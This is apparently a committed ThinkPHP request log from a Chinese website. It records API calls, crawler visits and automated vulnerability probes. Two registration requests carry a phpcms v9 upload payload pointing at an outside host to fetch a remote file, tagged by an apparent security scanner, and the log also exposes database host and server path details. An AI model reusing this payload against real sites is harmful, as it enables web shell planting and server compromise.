+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_sign` [ RunTime:0.003079s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_sign` WHERE  `mid` = 29 ORDER BY Id desc LIMIT 1 [ RunTime:0.002317s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:37+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/userinfo
+[ log ] www.alroy.cn/prisonapi/index/userinfo [运行时间：0.059900s][吞吐率：16.69req/s] [内存消耗：3,145.30kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'userinfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->userinfo[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007662s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_suspect` [ RunTime:0.003229s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_suspect` WHERE  `Id` = 29 LIMIT 1 [ RunTime:0.002656s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T09:33:24+08:00 ] 60.205.45.195 42.156.251.187 GET /
+[ log ] alroy.cn/ [运行时间：0.035681s][吞吐率：28.03req/s] [内存消耗：2,229.34kb] [文件加载：46]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xml;q=0.9,application/xhtml+xml,text/xml;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
+  'accept-charset' => 'utf-8,ISO-8859-1;q=0.7,*;q=0.7',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'host' => 'alroy.cn',
+  'user-agent' => 'spiderman',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /data/home/bxu2711760022/htdocs/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /data/home/bxu2711760022/htdocs/application/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-08-03T09:37:19+08:00 ] 60.205.45.195 123.125.71.81 GET /
+[ log ] www.alroy.cn/ [运行时间：0.067479s][吞吐率：14.82req/s] [内存消耗：2,229.79kb] [文件加载：46]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+  'accept-language' => 'zh-cn,zh-tw',
+  'connection' => 'close',
+  'host' => 'www.alroy.cn',
+  'if-none-match' => '"@NULL@"',
+  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /data/home/bxu2711760022/htdocs/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /data/home/bxu2711760022/htdocs/application/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-08-03T18:31:54+08:00 ] 60.205.45.195 140.205.201.42 POST /index.php?m=member&c=index&a=register&siteid=1
+[ log ] alroy.cn:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.033416s][吞吐率：29.93req/s] [内存消耗：2,232.29kb] [文件加载：46]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '171',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'host' => 'alroy.cn:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'ElsvqLJV',
+  'password' => 'ElsvqLJV',
+  'email' => 'ElsvqLJV@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /data/home/bxu2711760022/htdocs/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /data/home/bxu2711760022/htdocs/application/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-08-03T18:31:55+08:00 ] 60.205.45.195 140.205.201.42 GET /index.php?m=wap&a=index&siteid=1
+[ log ] alroy.cn:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.032735s][吞吐率：30.55req/s] [内存消耗：2,230.18kb] [文件加载：46]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'host' => 'alroy.cn:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /data/home/bxu2711760022/htdocs/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /data/home/bxu2711760022/htdocs/application/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-08-03T20:46:17+08:00 ] 60.205.45.195 140.205.225.185 POST /index.php?m=member&c=index&a=register&siteid=1
+[ log ] www.alroy.cn:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.035480s][吞吐率：28.18req/s] [内存消耗：2,232.12kb] [文件加载：46]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '171',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'host' => 'www.alroy.cn:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'XdJfsgau',
+  'password' => 'XdJfsgau',
+  'email' => 'XdJfsgau@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /data/home/bxu2711760022/htdocs/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /data/home/bxu2711760022/htdocs/application/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-08-03T20:46:17+08:00 ] 60.205.45.195 140.205.225.185 GET /index.php?m=wap&a=index&siteid=1
+[ log ] www.alroy.cn:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.032216s][吞吐率：31.04req/s] [内存消耗：2,230.13kb] [文件加载：46]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'host' => 'www.alroy.cn:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /data/home/bxu2711760022/htdocs/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /data/home/bxu2711760022/htdocs/application/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
